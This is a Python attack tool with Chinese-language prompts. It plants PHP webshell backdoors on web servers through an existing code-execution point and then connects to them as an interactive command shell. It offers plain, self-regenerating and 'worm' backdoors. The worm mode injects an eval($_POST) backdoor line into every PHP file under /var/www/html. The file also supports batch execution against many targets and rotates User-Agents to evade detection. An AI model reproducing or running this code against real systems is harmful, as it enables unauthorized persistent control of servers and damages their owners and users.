import time
import random
import requests
from webshell import ma_ordinary, ma_UndeadHorse
from color import color_print
echo = color_print()
ua = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
     "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"
]
rand_num = random.randint(1, len(ua))
header = {}
header["User-Agent"] = ua[rand_num-1]

def get_Command_Control(url, url_PHPpath,phpfile_Name, phpfile_Key, command):       #实现连接GET方法shell并执行命令、回显
    try:
            exp = url + url_PHPpath + f'/{phpfile_Name}?{phpfile_Key}={command}'
            sa = requests.get(exp, headers=header)
            print(sa.text)
    except:
        echo.print_red("[x] 利用失败，请手动尝试利用!")
def conn_Command_Control(url, command, phpfile_Key, selcet, ma_func):
    if ma_func.lower() == "n":
        exp = {
            f"{phpfile_Key}": f"system('{command}')"
        }
    elif ma_func.lower() == "y":
        exp = {
            f"{phpfile_Key}": f"{command}"
        }
    try:
        sa = requests.post(url, exp, headers=header, timeout=2)
        if selcet.lower() == "y":
            if sa.status_code == 200:
                echo.print_green(f"[+] URL: {url} 成功执行!!!")
                echo.print_green(f"[+] 正在导出结果, 请在output/result.txt文件夹中查看!!!")
                with open("output/result.txt", "a") as outfile:
                    outfile.write(str(sa.text))
            else:
                echo.print_red("[x] 结果保存失败, 正在尝试下一个!!!")
        elif selcet.lower() == "n":
            if sa.status_code == 200:
                echo.print_green(f"[*] 执行结果为 {sa.text} ")
            else:
                echo.print_red("[x] 结果保存失败, 正在尝试下一个!!!")
    except:
        pass
def post_Command_Control(url, phpfile_Name, phpfile_Key, command, num, url_PHPpath, upload_judgement, verb_execution_code, ma_func):
    try:
        if upload_judgement.lower() == "n":
            if int(num) == 0:
                if ma_func.lower() == "n":
                    exp = {
                        f"{phpfile_Key}": f"system('{command}')"
                    }
                elif ma_func.lower() == "y":
                    exp = {
                        f"{phpfile_Key}": f"{command}"
                    }
                url_exp = url + url_PHPpath +f'{phpfile_Name}.php'
                sa = requests.post(url_exp, headers=header, data=exp)
                echo.print_green(sa.text)
            elif int(num) == 1:
                if ma_func.lower() == "n":
                    exp = {
                        f"{phpfile_Key}": f"system('{command}')"
                    }
                elif ma_func.lower() == "y":
                    exp = {
                        f"{phpfile_Key}": f"{command}"
                    }
                url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                sa = requests.post(url_exp, headers=header, data=exp)
                echo.print_green(sa.text)
            elif int(num) == 2:
                echo.print_yellow("-------------------正在感染蠕虫木马-------------------")
                if command is not None:
                    if ma_func.lower() == "n":
                        exp = {
                            f"{phpfile_Key}": f"system('{command}')"
                        }
                    elif ma_func.lower() == "y":
                        exp = {
                            f"{phpfile_Key}": f"{command}"
                        }
                    # exp = {
                    #     f"{phpfile_Key}": f"system('{command}')"
                    #     # f"system('find ./ -name \"*.php\" -exec sed -i '\$a<?php @eval(\$_POST[\"{phpfile_Key + st}\"]);?>'\\;\");')"
                    # }
                    url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                    sa = requests.post(url_exp, headers=header, data=exp)
                    echo.print_green(sa.text)
                    pay = '"find /var/www/html/ -name \\"*.php\\" -exec sed -i \'\$a<?php @eval(\$_POST[\\"5db321ce\\"]);?>\' {} \\\\;"'
                    if ma_func.lower() == "n":
                        exp = {
                            f"{phpfile_Key}": f"system('{pay}')"
                        }
                    elif ma_func.lower() == "y":
                        exp = {
                            f"{phpfile_Key}": f"{pay}"
                        }
                    url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                    requests.post(url_exp, headers=header, data=exp)
                    echo.print_blue("----------------蠕虫感染完成,请手动检查-------------------")
                elif command is None:
                    pay = '"find /var/www/html/ -name \\"*.php\\" -exec sed -i \'\$a<?php @eval(\$_POST[\\"5db321ce\\"]);?>\' {} \\\\;"'
                    if ma_func.lower() == "n":
                        exp = {
                            f"{phpfile_Key}": f"system('{pay}')"
                        }
                    elif ma_func.lower() == "y":
                        exp = {
                            f"{phpfile_Key}": f"{pay}"
                        }
                    print(args[0])
                    print("---------------------------------------------------------")
                    print(exp)
                    url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                    requests.post(url_exp, headers=header, data=exp)
                    echo.print_blue("----------------蠕虫感染完成,请手动检查-------------------")
        elif upload_judgement.lower() == "y":
            if verb_execution_code.lower() == "n":
                if int(num) == 0:
                    if ma_func.lower() == "n":
                        exp = {
                            f"{phpfile_Key}": f"system('{command}')"
                        }
                    elif ma_func.lower() == "y":
                        exp = {
                            f"{phpfile_Key}": f"{command}"
                        }
                    url_exp = url + url_PHPpath + f'{phpfile_Name}.php'
                    sa = requests.post(url_exp, headers=header, data=exp)
                elif int(num) == 1:
                    if ma_func.lower() == "n":
                        exp = {
                            f"{phpfile_Key}": f"system('{command}')"
                        }
                    elif ma_func.lower() == "y":
                        exp = {
                            f"{phpfile_Key}": f"{command}"
                        }
                    url_exp = url + url_PHPpath + f'{phpfile_Name}f0r.php'
                    sa = requests.post(url_exp, headers=header, data=exp)
                elif int(num) == 2:
                    echo.print_yellow("-------------------正在感染蠕虫木马-------------------")
                    if command is not None:
                        # exp = {
                        #     f"{phpfile_Key}": f"system('{command}')"
                        #     # f"system('find ./ -name \"*.php\" -exec sed -i '\$a<?php @eval(\$_POST[\"{phpfile_Key + st}\"]);?>'\\;\");')"
                        # }
                        if ma_func.lower() == "n":
                            exp = {
                                f"{phpfile_Key}": f"system('{command}')"
                            }
                        elif ma_func.lower() == "y":
                            exp = {
                                f"{phpfile_Key}": f"{command}"
                            }
                        print(exp)
                        url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                        sa = requests.post(url_exp, headers=header, data=exp)
                        echo.print_green(sa.text)
                        pay = '"find /var/www/html/ -name \\"*.php\\" -exec sed -i \'\$a<?php @eval(\$_POST[\\"5db321ce\\"]);?>\' {} \\\\;"'
                        if ma_func.lower() == "n":
                            exp = {
                                f"{phpfile_Key}": f"system('{pay}')"
                            }
                        elif ma_func.lower() == "y":
                            exp = {
                                f"{phpfile_Key}": f"{pay}"
                            }
                        url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                        requests.post(url_exp, headers=header, data=exp)
                        echo.print_blue("----------------蠕虫感染完成,请手动检查-------------------")
                    elif command is None:
                        pay = '"find /var/www/html/ -name \\"*.php\\" -exec sed -i \'\$a<?php @eval(\$_POST[\\"5db321ce\\"]);?>\' {} \\\\;"'
                        if ma_func.lower() == "n":
                            exp = {
                                f"{phpfile_Key}": f"system('{pay}')"
                            }
                        elif ma_func.lower() == "y":
                            exp = {
                                f"{phpfile_Key}": f"{pay}"
                            }
                        print(args[0])
                        url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                        sa = requests.post(url_exp, headers=header, data=exp)
                        echo.print_blue("----------------蠕虫感染完成,请手动检查-------------------")
                if sa.status_code == 200:
                    echo.print_green(f"[+] URL: {url_exp} 成功执行!!!")
                    echo.print_green(f"[+] 正在导出结果, 请在output文件夹中查看!!!")
                    with open("output/success.txt", "a") as outfile:
                        outfile.write(str(url_exp))
                else:
                    echo.print_red(f"[x] URL: {url_exp} 保存失败!!!")
                    echo.print_red("[x] 正在尝试下一个目标, 请稍等!!!")
            elif verb_execution_code == "Y" or verb_execution_code == "y":
                if int(num) == 0:
                    if ma_func.lower() == "n":
                        exp = {
                            f"{phpfile_Key}": f"system('{command}')"
                        }
                    elif ma_func.lower() == "y":
                        exp = {
                            f"{phpfile_Key}": f"{command}"
                        }
                    url_exp = url + url_PHPpath + f'{phpfile_Name}.php'
                    sa = requests.post(url_exp, headers=header, data=exp)
                elif int(num) == 1:
                    if ma_func.lower() == "n":
                        exp = {
                            f"{phpfile_Key}": f"system('{command}')"
                        }
                    elif ma_func.lower() == "y":
                        exp = {
                            f"{phpfile_Key}": f"{command}"
                        }
                    url_exp = url + url_PHPpath + f'{phpfile_Name}f0r.php'
                    sa = requests.post(url_exp, headers=header, data=exp, timeout=3)
                elif int(num) == 2:
                    echo.print_yellow("-------------------正在感染蠕虫木马-------------------")
                    if command is not None:
                        if ma_func.lower() == "n":
                            exp = {
                                f"{phpfile_Key}": f"system('{command}')"
                            }
                        elif ma_func.lower() == "y":
                            exp = {
                                f"{phpfile_Key}": f"{command}"
                            }
                        url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                        sa = requests.post(url_exp, headers=header, data=exp)
                        echo.print_green(sa.text)
                        pay = '"find /var/www/html/ -name \\"*.php\\" -exec sed -i \'\$a<?php @eval(\$_POST[\\"5db321ce\\"]);?>\' {} \\\\;"'
                        if ma_func.lower() == "n":
                            exp = {
                                f"{phpfile_Key}": f"system('{pay}')"
                            }
                        elif ma_func.lower() == "y":
                            exp = {
                                f"{phpfile_Key}": f"{pay}"
                            }
                        print(args[0])
                        url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                        requests.post(url_exp, headers=header, data=exp)
                        echo.print_blue("----------------蠕虫感染完成,请手动检查-------------------")
                    elif command is None:
                        pay = '"find /var/www/html/ -name \\"*.php\\" -exec sed -i \'\$a<?php @eval(\$_POST[\\"5db321ce\\"]);?>\' {} \\\\;"'
                        if ma_func.lower() == "n":
                            exp = {
                                f"{phpfile_Key}": f"system('{pay}')"
                            }
                        elif ma_func.lower() == "y":
                            exp = {
                                f"{phpfile_Key}": f"{pay}"
                            }
                        print(exp)
                        url_exp = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                        sa = requests.post(url_exp, headers=header, data=exp)
                        echo.print_blue("----------------蠕虫感染完成,请手动检查-------------------")
                if sa.status_code == 200:
                    echo.print_green(f"[+] URL: {url_exp} successfully executed!!!")
                    echo.print_green(f"[+] 正在导出结果, 请在output文件夹中查看!!!")
                    with open("output/success.txt", "a") as outfile:
                        outfile.write(str(url_exp) + "|" + str(sa.text) + "\n")
                else:
                    echo.print_red(f"[-] URL: {url_exp} Utilization failure!!!")
                    echo.print_yellow(f"[-] 正在尝试下一个目标, 请稍等!!!")
    except:
        echo.print_red("[x] 利用失败，请手动尝试利用!")

def select_ma(phpfile_Name, phpfile_Key, sel_ma):
    help = """
----------------------------------后门木马选择----------------------------------------------------
    输入 0 上传普通后门木马                                                        
    输入 1 上传不死马(隐藏源文件，生成影子文件并周期循环执行后门生成代码)                         
    输入 2 上传蠕虫不死木马(可一键感染当前目录所有的php文件，使得当前php文件变成不死木马)
--------------------------------------------------------------------------------------------------
    """
    if sel_ma == None:
        echo.print_blue(help)
        num = int(input("请输入上传木马类型(0/1/2):"))
        if num == 0:
            payload = ma_ordinary(phpfile_Key)
            print(f"Payload:{payload}")
        elif num == 1:
            payload = ma_UndeadHorse(phpfile_Name, phpfile_Key)
            print(f"Payload:{payload}")
        elif num == 2:
            payload = ma_UndeadHorse(phpfile_Name, phpfile_Key)
            print(f"Payload:{payload}")
        else:
            return
        return payload, num
    else:
        if sel_ma == 0:
            payload = ma_ordinary(phpfile_Key)
            print(f"Payload:{payload}")
        elif sel_ma == 1:
            payload = ma_UndeadHorse(phpfile_Name, phpfile_Key)
            print(f"Payload:{payload}")
        elif sel_ma == 2:
            payload = ma_UndeadHorse(phpfile_Name, phpfile_Key)
            print(f"Payload:{payload}")
        else:
            return
        return payload, sel_ma

def upload_PHPma(url, method, url_PHPpath, phpmaKey, ma_method, url_PHPfile, verb_execution_code, upload_judgement, execution_code, sel_ma, phpfile_Name, phpfile_Key, ma_func): # 待完成，检测system函数
    try:
        global args
        method = method
        args = []
        if upload_judgement == "Y" or upload_judgement == "y":
            payload, num = select_ma(phpfile_Name, phpfile_Key, sel_ma)
            args.append(payload)
            args.append(num)
        else:
            payload, num = select_ma(phpfile_Name, phpfile_Key, sel_ma=None)
            args.append(payload)
            args.append(num)

        if method.lower() == 'get':
            if ma_method.lower() == "y":
                try:
                    url_exp = url + url_PHPpath + url_PHPfile + f"?{phpmaKey}=" + f"file_put_contents(\'{phpfile_Name}.php\', \'{args[0]}\');"
                except:
                    echo.print_red("[x] 选择木马类型时出错!!!")
            elif ma_method.lower() == "n":
                try:
                    url_exp = url + str(url_PHPpath) + url_PHPfile +  f'?{phpmaKey}=' + f'fputs( fopen(\'{phpfile_Name}.php\',\'w\'), \'{args[0]}\');'
                except:
                    print("选择木马类型时出错!!!")
            else:
                echo.print_yellow("请输入正确参数值, 否则可能会运行错误!!!")
                return
            echo.print_purple("---------------正在植入木马----------------")
            requests.get(url=url_exp, headers=header, verify=False)
            url_Poc = url + url_PHPpath + phpfile_Name + ".php"
            print(url_Poc)
            if args[1] == 0:
                response = requests.get(url_Poc, headers=header, verify=False)
                print(response.status_code)
                if response.status_code == 200:
                    echo.print_purple(f"[*] 植入后门成功,利用路径为:{url}/{phpfile_Name}.php")
                    if upload_judgement == "N" or upload_judgement == "n":
                        conn = input("是否连接后门(y/n):")
                        if conn.lower() == "y":
                            print("\033[0;35m正在尝试连接后门木马，请稍等\033[0m")
                            while True:
                                cmd = input('>')
                                post_Command_Control(url, phpfile_Name, phpfile_Key, command=cmd, num=args[1], url_PHPpath=url_PHPpath, upload_judgement=upload_judgement, verb_execution_code=verb_execution_code, ma_func=ma_func)
                    elif upload_judgement.lower() == "y":
                        if verb_execution_code.lower() == "y":
                            print(f"\033[0;36m请稍等, 正在批量执行语句{execution_code}!!!\033[0m")
                            post_Command_Control(url, phpfile_Name, phpfile_Key, command=execution_code, num=args[1],url_PHPpath=url_PHPpath, upload_judgement=upload_judgement, verb_execution_code=verb_execution_code, ma_func=ma_func)
                        elif verb_execution_code == "n" or verb_execution_code == "N":
                            print(f"[+] URL: {url_Poc} write successful!!!")
                            print(f"[+] URL: {url_Poc} 正在写入文档, 请在output文件夹下查看结果!!!")
                            filetime = time.strftime('%d_%H_%M',time.localtime(time.time()))
                            with open(f"output/success_{filetime}.txt", "a") as outfile:
                                outfile.write(url_Poc)
                else:
                    echo.print_red("[x] GET方式上传失败!!!")
            elif args[1] == 1:
                response = requests.get(url_Poc, headers=header, verify=False)
                if response.status_code not in [200]:
                    url_poc = url + url_PHPpath +f"/{phpfile_Name}f0r.php"
                    resp = requests.get(url_poc, headers=header, verify=False, timeout=2)
                    if resp.status_code == 200:
                        print(f"\033[0;35m[*] 植入后门成功,利用路径为:{url}{url_PHPpath}{phpfile_Name}f0r.php\033[0m")
                        if upload_judgement == "N" or upload_judgement == "n":
                            conn = input("是否连接后门(y/n):")
                            if conn == "y" or conn == "Y":
                                echo.print_purple("正在尝试连接后门木马，请稍等...")
                                while True:
                                    cmd = input('>')
                                    post_Command_Control(url, phpfile_Name, phpfile_Key, command=cmd, num=args[1],
                                                         url_PHPpath=url_PHPpath, upload_judgement=upload_judgement, verb_execution_code=verb_execution_code, ma_func=ma_func)
                        elif upload_judgement.lower() == "y":
                            if verb_execution_code.lower() == "y":
                                print(f"\033[0;36m请稍等, 正在批量执行语句{execution_code}!!!\033[0m")
                                post_Command_Control(url, phpfile_Name, phpfile_Key, command=execution_code,
                                                     num=args[1], url_PHPpath=url_PHPpath,
                                                     upload_judgement=upload_judgement, verb_execution_code=verb_execution_code, ma_func=ma_func)
                            elif verb_execution_code.lower() == "n":
                                print(f"[+] URL: {url_Poc} write successful!!!")
                                print(f"[+] URL: {url_poc} 正在写入文档, 请在output文件夹下查看结果!!!")
                                filetime = time.strftime('%d_%H_%M', time.localtime(time.time()))
                                with open(f"output/success_{filetime}.txt", "a") as outfile:
                                    outfile.write(url_poc)
                    else:
                        echo.print_red(f"后门木马:{url}{url_PHPpath}{phpfile_Name}f0r.php 植入失败!!!")
                else:
                    echo.print_red(f"后门木马:{url}{url_PHPpath}{phpfile_Name}f0r.php 植入失败!!!")
            elif args[1] == 2:
                response = requests.get(url_Poc, headers=header, verify=False)
                if response.status_code not in [200]:
                    url_poc = url + url_PHPpath + f"/{phpfile_Name}f0r.php"
                    resp = requests.get(url_poc, headers=header, verify=False, timeout=2)
                    if resp.status_code == 200:
                        print(f"\033[0;35m[*] 植入后门成功,利用路径为:{url}{url_PHPpath}{phpfile_Name}f0r.php\033[0m")
                        if upload_judgement.lower() == "n":
                            conn = str(input("是否连接不死马(y/n):"))
                            if conn.lower() == "y":
                                while True:
                                    cmd = str(input(">"))
                                    post_Command_Control(url, phpfile_Name, phpfile_Key, command=cmd, num=args[1],
                                                         url_PHPpath=url_PHPpath, upload_judgement=upload_judgement,
                                                         verb_execution_code=verb_execution_code, ma_func=ma_func)
                            elif conn.lower() == "n":
                                cmd = None
                                post_Command_Control(url, phpfile_Name, phpfile_Key, command=cmd, num=args[1],
                                                    url_PHPpath=url_PHPpath, upload_judgement=upload_judgement,
                                                     verb_execution_code=verb_execution_code, ma_func=ma_func)
                        elif upload_judgement.lower() == "y":
                            if verb_execution_code.lower() == "y":
                                echo.print_blue("---------------正在尝试批量执行语句---------------")
                                post_Command_Control(url, phpfile_Name, phpfile_Key, command=execution_code,
                                                     num=args[1], url_PHPpath=url_PHPpath,
                                                     upload_judgement=upload_judgement,
                                                     verb_execution_code=verb_execution_code, ma_func=ma_func)
                                print(f"[+] URL: {url_Poc} write successful!!!")
                                print(f"[+] URL: {url_poc} 正在写入文档, 请在output文件夹下查看结果!!!")
                                filetime = time.strftime('%d_%H_%M', time.localtime(time.time()))
                                with open(f"output/success_{filetime}.txt", "a") as outfile:
                                    outfile.write(url_poc)
                            elif verb_execution_code.lower() == "n":
                                execution_code = None
                                post_Command_Control(url, phpfile_Name, phpfile_Key, command=execution_code,
                                                     num=args[1], url_PHPpath=url_PHPpath,
                                                     upload_judgement=upload_judgement,
                                                     verb_execution_code=verb_execution_code, ma_func=ma_func)
                                print(f"[+] URL: {url_Poc} write successful!!!")
                                print(f"[+] URL: {url_poc} 正在写入文档, 请在output文件夹下查看结果!!!")
                                filetime = time.strftime('%d_%H_%M', time.localtime(time.time()))
                                with open(f"output/success_{filetime}.txt", "a") as outfile:
                                    outfile.write(url_poc)
                    else:
                        print(f"后门木马:{url}{url_PHPpath}{phpfile_Name}f0r.php 植入失败!!!")

        elif method == 'POST' or method == 'post':
            if ma_method.lower() == "y":
                data = {
                    f"{phpmaKey}": f"file_put_contents(\'{phpfile_Name}.php\', \'{args[0]}\');"
                }
            elif ma_method.lower() == "n":
                data = {
                    f"{phpmaKey}": f"fputs(fopen(\'{phpfile_Name}.php\',\'w\'), \'{args[0]}\');"
                }
            else:
                print("\033[0;35m请输入正确参数值, 否则可能会运行错误!!!\033[0m")

            print("\033[0;35m---------------正在植入木马----------------\033[0m")
            print(data)
            url_exp = url + url_PHPpath + url_PHPfile    # 写入另外的后门木马
            print(url_exp)
            requests.post(url=url_exp, data=data, headers=header, verify=False, timeout=2)
            print(url_exp)
            if args[1] == 0:
                url_poc = url + url_PHPpath + phpfile_Name + ".php"
                requs = requests.post(url_poc, headers=header, verify=False, timeout=2)
                if requs.status_code == 200:
                    print(f"\033[0;35m[*] 植入后门成功,利用路径为:{url_poc}\033[0m")
                    if upload_judgement == "N" or upload_judgement == "n":
                        conn = input("是否连接后门(y/n):")
                        if conn == "y" or conn == "Y":
                            print("\033[0;35m正在尝试连接后门木马，请稍等\033[0m")
                            while True:
                                cmd = input('>')
                                post_Command_Control(url, phpfile_Name, phpfile_Key, command=cmd, num=args[1],
                                                     url_PHPpath=url_PHPpath, upload_judgement=upload_judgement, verb_execution_code=verb_execution_code, ma_func=ma_func)
                    elif upload_judgement.lower() == "y":
                        if verb_execution_code.lower() == "y":
                            print(f"\033[0;36m请稍等, 正在执行语句{execution_code}\033[0m")
                            post_Command_Control(url, phpfile_Name, phpfile_Key, command=execution_code, num=args[1],
                                                 url_PHPpath=url_PHPpath, upload_judgement=upload_judgement, verb_execution_code=verb_execution_code, ma_func=ma_func)
                        elif verb_execution_code == "n" or verb_execution_code == "N":
                            print(f"[+] URL: {url_poc} write successful!!!")
                            print(f"[+] URL: {url_poc} 正在写入文档, 请在output文件夹下查看结果!!!")
                            filetime = time.strftime('%d_%H_%M', time.localtime(time.time()))
                            with open(f"output/success_{filetime}.txt", "a") as outfile:
                                outfile.write(url_poc)
                else:
                    echo.print_red("[x]" + " " + url_poc + " 利用失败!!!")
            elif args[1] == 1:
                try:
                    url_Poc = url + url_PHPpath +f"{phpfile_Name}.php"
                    print("正在启动不死马后门,请稍等!!!")
                    requests.post(url_Poc, headers=header, timeout=2)
                except:
                    print(f"\033[0;33m[*] 不死木马启动成功!!!\033[0m")
                try:
                    url_poc = url + url_PHPpath +f"{phpfile_Name}f0r.php"
                    requs = requests.post(url_poc, headers=header, verify=False)
                except:
                    print(f"不死马生成文件 {phpfile_Name}f0r.php 访问失败!!!")
                if requs.status_code == 200:
                    print(f"\033[0;35m[*] 植入后门成功,利用路径为:{url}{url_PHPpath}{phpfile_Name}f0r.php\033[0m")
                    if upload_judgement.lower() == "n":
                        conn = input("是否连接后门(y/n):")
                        if conn.lower() == "y":
                            print("\033[0;35m正在尝试连接后门木马，请稍等\033[0m")
                            # phpfile_Name = phpfile_Name + "f0r.php"
                            while True:
                                cmd = input('>')
                                post_Command_Control(url, phpfile_Name, phpfile_Key, command=cmd, num=args[1],
                                                 url_PHPpath=url_PHPpath, upload_judgement=upload_judgement, verb_execution_code=verb_execution_code, ma_func=ma_func)
                    elif upload_judgement.lower() == "y":
                        if verb_execution_code.lower() == "y":
                            print(f"\033[0;36m请稍等, 正在执行语句{execution_code}\033[0m")
                            post_Command_Control(url, phpfile_Name, phpfile_Key, command=execution_code, num=args[1],
                                                 url_PHPpath=url_PHPpath, upload_judgement=upload_judgement, verb_execution_code=verb_execution_code, ma_func=ma_func)
                        elif verb_execution_code.lower() == "n":
                            print(f"[+] URL: {url_poc} write successful!!!")
                            print(f"[+] URL: {url_poc} 正在写入文档, 请在output文件夹下查看结果!!!")
                            filetime = time.strftime('%d_%H_%M', time.localtime(time.time()))
                            with open(f"output/success_{filetime}.txt", "a") as outfile:
                                outfile.write(url_poc)
                else:
                    echo.print_red(f"{url + url_PHPpath + phpfile_Name + 'f0r.php'}利用失败!!!")
            elif args[1] == 2:
                try:
                    url_Poc = url + url_PHPpath + f"{phpfile_Name}.php"
                    print("正在启动不死马后门,请稍等!!!")
                    requests.post(url_Poc, headers=header, timeout=2)
                except:
                    print(f"\033[0;33m[*] 不死木马启动成功!!!\033[0m")
                try:
                    url_poc = url + url_PHPpath + f"{phpfile_Name}f0r.php"
                    requs = requests.post(url_poc, headers=header, verify=False)
                except:
                    print(f"不死马生成文件 {phpfile_Name}f0r.php 访问失败!!!")
                if requs.status_code == 200:
                    print(f"\033[0;35m[*] 植入后门成功,利用路径为:{url}{url_PHPpath}{phpfile_Name}f0r.php\033[0m")
                    if upload_judgement.lower() == "n":
                        conn = str(input("是否连接不死马(y/n):"))
                        if conn.lower() == "y":
                            while True:
                                cmd = str(input(">"))
                                post_Command_Control(url, phpfile_Name, phpfile_Key, command=cmd, num=args[1],
                                                     url_PHPpath=url_PHPpath, upload_judgement=upload_judgement,
                                                     verb_execution_code=verb_execution_code, ma_func=ma_func)
                        elif conn.lower() == "n":
                            cmd = None
                            post_Command_Control(url, phpfile_Name, phpfile_Key, command=cmd, num=args[1],
                                             url_PHPpath=url_PHPpath, upload_judgement=upload_judgement,
                                             verb_execution_code=verb_execution_code, ma_func=ma_func)
                    elif upload_judgement.lower() == "y":
                        if verb_execution_code.lower() == "y":
                            print(f"\033[0;36m请稍等, 正在执行语句{execution_code}\033[0m")
                            post_Command_Control(url, phpfile_Name, phpfile_Key, command=execution_code, num=args[1],
                                                 url_PHPpath=url_PHPpath, upload_judgement=upload_judgement,
                                                 verb_execution_code=verb_execution_code, ma_func=ma_func)
                        elif verb_execution_code.lower() == "n":
                            execution_code = None
                            post_Command_Control(url, phpfile_Name, phpfile_Key, command=execution_code, num=args[1],
                                                 url_PHPpath=url_PHPpath, upload_judgement=upload_judgement,
                                                 verb_execution_code=verb_execution_code, ma_func=ma_func)
                            print(f"[+] URL: {url_poc} write successful!!!")
                            print(f"[+] URL: {url_poc} 正在写入文档, 请在output文件夹下查看结果!!!")
                            filetime = time.strftime('%d_%H_%M', time.localtime(time.time()))
                            with open(f"output/success_{filetime}.txt", "a") as outfile:
                                outfile.write(url_poc)
                    else:
                        echo.print_red(f"{url + url_PHPpath + phpfile_Name + 'f0r.php'}利用失败!!!")
            else:
                echo.print_red("[x] POST方式上传失败!!!")
    except:
        echo.print_yellow("\nERROR EXIT!")